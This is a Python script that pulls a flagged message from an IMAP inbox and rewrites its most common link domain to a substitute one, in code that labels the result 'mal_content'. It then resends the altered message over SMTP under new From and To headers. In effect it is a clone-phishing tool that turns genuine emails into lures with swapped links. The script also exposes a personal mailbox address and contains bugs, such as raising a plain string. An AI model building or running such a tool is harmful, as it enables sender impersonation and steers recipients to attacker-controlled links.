import base64
import quopri
import imaplib
import email
from collections import Counter
import ssl
import smtplib


def rev_dict(dic: dict) -> dict:
    d = {}
    for el in dic:
        if d.get(dic[el]) != None:
            raise "Alert!"
        d[dic[el]] = el

    return d
def analyze_refs(content: str, email_replacement: str) -> list:
    refs = []
    cto = []
    email_protocols = [
        "mailto://",  # default protocol for email addresses
        "http://",  # sometimes used for email addresses, but not recommended
        "https://",  # sometimes used for email addresses, but not recommended
        "xmpp://",  # for Jabber/XMPP addresses
        "sip://",  # for SIP (Session Initiation Protocol) addresses
        "sips://",  # for secure SIP addresses
        "tel://",  # for telephone numbers
        "telnet://",  # for telnet addresses
        "fax://",  # for fax numbers
        "modem://",  # for modem connections
        "news://",  # for Usenet news groups
        "nntp://",  # for Usenet news groups
        "mailto://",  # default protocol for email addresses
        "mms://",  # for Multimedia Messaging Service (MMS) addresses
        "sms://",  # for Short Message Service (SMS) addresses
        "gtalk://",  # for Google Talk addresses
        "skype://",  # for Skype addresses
        "aim://",  # for AOL Instant Messenger (AIM) addresses
        "icq://",  # for ICQ addresses
        "irc://",  # for Internet Relay Chat (IRC) addresses
        "ldap://",  # for Lightweight Directory Access Protocol (LDAP) addresses
        "magnet://",  # for Magnet URI scheme
        "webcal://",  # for iCalendar addresses
        "wtai://",  # for Wireless Telephony Application Interface (WTAI) addresses
        "urn://",  # for Uniform Resource Names (URNs)
    ]
    common_image_formats = [
        "jpeg",
        "jpg",
        "png",
        "gif",
        "bmp",
        "tiff",
        "tif",
        "ico",
        "webp"
    ]

    for el in content.split("\n"):
        for protocol in email_protocols:
            if protocol in el:
                _ = el[el.index(protocol) + len(protocol) : el.find("?")]
                _ = _[:_.find("/")]
                cto.append(_)
                flag = 1
                for __ in common_image_formats:
                    if __ in el[el.index(protocol):el.index("\r")]:
                        flag = 0
                        break
                if flag:
                    refs.append(el[el.index(protocol):el.index("\r")])

    _ = rev_dict(Counter(cto))
    email_to_replace = _[max(_)]
    r = refs.copy()
    for i in range(len(refs)):
        refs[i] = refs[i].replace(email_to_replace, email_replacement)
    return [r, refs]


def change_content(content: str) -> str:
    or_r, mal_refs = analyze_refs(content, "example.com")
    for i in range(len(or_r)):
        content = content.replace(or_r[i], mal_refs[i])
    return content


def find_cte(part: str) -> str:
    for el in part.split("\n"):
        if 'Content-Transfer-Encoding' in el:
            return el.split()[-1]
    return ""

def update_content(message):
    print(message)
    for part in message.walk():
        encoding = find_cte(str(part)).lower()
        # Get the content-type
        content_type = part.get_content_type()

        encoding = "8bit"
        # Determine the new content-transfer-encoding
        if 'plain' in content_type or 'html' in content_type:
            content = part.get_payload()
            mal_content = change_content(content)
            if encoding == 'base64':
                new_content = base64.b64encode(mal_content.encode()).decode()
                # new_content = mal_content
            elif encoding == 'quoted-printable':
                new_content = quopri.encodestring(mal_content.encode()).decode()
            else:
                new_content = mal_content

            # Set the new content-transfer-encoding
            part.set_type(content_type)
            part.set_payload(new_content)
            # part.set_param('Content-Transfer-Encoding', encoding)
            del part['Content-Transfer-Encoding']
            part['Content-Transfer-Encoding'] = encoding
        else:
            # Leave the content-transfer-encoding unchanged
            pass

    return message


def resend_email(username, password, recipient, smtp_server, msg, smtp_port=587):
    # Parse the original message
    # msg = email.message_from_bytes(original_message)
    # Create a new message with the same content
    resend_msg = email.message.EmailMessage()

    # Copy the original message headers
    for header in ['Subject', 'Date', 'Message-ID']:
        resend_msg[header] = msg[header].replace("\r\n", "").replace("\n", "")

    # Replace the original recipient with the new recipient
    resend_msg['To'] = recipient
    resend_msg['From'] = username
    # Copy the original message payload
    for part in msg.walk():
        if part.get_content_type() == 'text/plain':
            resend_msg.add_alternative(part.get_payload(), subtype='plain')
        elif part.get_content_type() == 'text/html':
            resend_msg.add_alternative(part.get_payload(), subtype='html')
        else:
            resend_msg.attach(part)

    # Create a secure SSL context
    context = ssl.create_default_context()

    # Send the email
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls(context=context)
        server.login(username, password)
        server.sendmail(username, recipient, resend_msg.as_string())

# Set up your email credentials
username = 'verart1@yandex.ru'
password = ''

# Connect to the IMAP server
mail = imaplib.IMAP4_SSL('imap.yandex.ru')
mail.login(username, password)
mail.select('inbox')

# Search for emails
# status, response = mail.search(None, "(FROM 'education@email.ptsecurity.com')")
status, response = mail.search(None, "(FLAGGED)")
message = ""
# Iterate over the emails
for num in response[0].split():
    res, msg = mail.fetch(num, "(RFC822)")

    # Parse the email message
    raw_message = msg[0][1]
    message = email.message_from_bytes(raw_message)
    sender = message["From"]
    sender = sender[sender.rfind("<")+1:-1]
    print(f"Sender: {sender}")
    # Get the email content
    i = 0
    message = update_content(message)

    # print(message)

    # Break the loop after processing one email
    break  # This line should be removed if you want to process all emails


resend_email('', '', username, 'smtp.mail.ru', message)
# resend_email(username, password, username, 'smtp.yandex.ru', message, smtp_port=465)

# Close the IMAP connection
mail.close()
mail.logout()